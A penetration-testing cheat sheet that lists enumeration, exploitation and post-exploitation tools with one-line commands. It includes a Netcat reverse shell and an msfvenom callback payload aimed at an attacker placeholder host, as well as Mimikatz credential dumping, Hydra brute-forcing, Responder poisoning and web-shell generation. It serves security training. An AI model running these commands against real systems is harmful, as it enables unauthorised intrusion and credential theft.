# Tools

## Enumeration Tools

These tools are essential for gathering information about the target system, such as open ports, services, and potential vulnerabilities.

- **Nmap**: A powerful network scanning tool used to discover hosts, services, and vulnerabilities.
  - Command: `nmap -sC -sV -oA scan_results <target_ip>`
  
- **Nikto**: A web server scanner that identifies various vulnerabilities like outdated software, security misconfigurations, and common web server issues.
  - Command: `nikto -h <target_ip>`

- **DirBuster/Dirsearch**: Tools used to perform directory and file brute-forcing on web servers.
  - Command: `dirb http://<target_ip>/`

- **Gobuster**: A tool for directory and DNS busting, often used for finding hidden directories or subdomains.
  - Command: `gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt`

- **Enum4linux**: A Linux tool used to gather information from Windows machines using SMB.
  - Command: `enum4linux -a <target_ip>`

- **SMBclient**: A client for accessing shared folders on Windows machines via SMB.
  - Command: `smbclient //target_ip/share -U username`

- **Netcat**: A versatile networking tool used for connecting to remote systems and debugging or scanning networks.
  - Command: `nc -lvp 4444` (for listening on a local port)

- **Netdiscover**: A tool for discovering hosts in a local network via ARP requests.
  - Command: `netdiscover -r 192.168.1.0/24`

- **WhatWeb**: A web application fingerprinting tool to identify technologies and services in use on web servers.
  - Command: `whatweb <target_ip>`

## Exploitation Tools

These tools are used for exploiting known vulnerabilities or misconfigurations in systems and applications.

- **Metasploit Framework**: A powerful exploitation framework used for automating the process of exploiting vulnerabilities.
  - Command: `msfconsole`

- **SQLmap**: A tool for automating SQL injection and database takeover.
  - Command: `sqlmap -u "http://<target_ip>/page?id=1" --dbs`

- **Hydra**: A tool used for brute-force attacks against services like SSH, FTP, HTTP, and more.
  - Command: `hydra -l <username> -P <password_list> ssh://<target_ip>`

- **John the Ripper**: A password cracking tool used to break hashes from various services (including Linux, Windows, and more).
  - Command: `john --wordlist=<password_list> <hash_file>`

- **Mimikatz**: A tool for extracting passwords and other credentials from Windows systems, including Kerberos tickets and clear-text passwords.
  - Command: `mimikatz.exe sekurlsa::logonPasswords`

- **MSFvenom**: A part of the Metasploit framework used to generate payloads for various platforms.
  - Command: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > payload.exe`

- **Responder**: A tool used to poison network traffic and capture login credentials via LLMNR, NBT-NS, and DNS poisoning.
  - Command: `responder -I eth0`

- **Empire**: A post-exploitation framework that includes powershell agents for lateral movement and persistence.
  - Command: `python2 empire`

- **BeEF (Browser Exploitation Framework)**: A tool used to launch attacks from the browser context by exploiting vulnerabilities in web applications.
  - Command: `./beef`

## Post-Exploitation Tools

These tools are used after successful exploitation to maintain persistence, escalate privileges, and gather further information from compromised systems.

- **Netcat**: Can also be used during post-exploitation for creating reverse shells and tunneling data.
  - Command: `nc -e /bin/bash <attacker_ip> <port>`

- **PowerSploit**: A collection of PowerShell scripts for post-exploitation activities, including privilege escalation, credential dumping, and more.
  - Command: `import-module PowerSploit`

- **Weevely**: A web shell that allows remote access and manipulation of compromised web servers.
  - Command: `weevely generate <password> <webshell_location>`

- **Powershell Empire**: A post-exploitation tool using PowerShell for pivoting, credential harvesting, and data exfiltration.
  - Command: `python2 empire`

- **TheFatRat**: A tool for creating various types of malicious payloads, which can include reverse shells, Trojans, and more.
  - Command: `./setup.sh`

- **Chisel**: A fast TCP/UDP tunnel over HTTP, useful for tunneling traffic through firewalls.
  - Command: `./chisel client <target_ip>:<port> <local_port>:<remote_port>`

- **PrivescCheck**: A tool for checking possible privilege escalation vectors on Windows systems.
  - Command: `PrivescCheck.exe`

- **LinPEAS**: A Linux privilege escalation script that checks for common misconfigurations and vulnerabilities.
  - Command: `./linpeas.sh`

- **LinEnum**: A script that automates the process of enumerating system information and potential privilege escalation vectors in Linux environments.
  - Command: `./linenum.sh`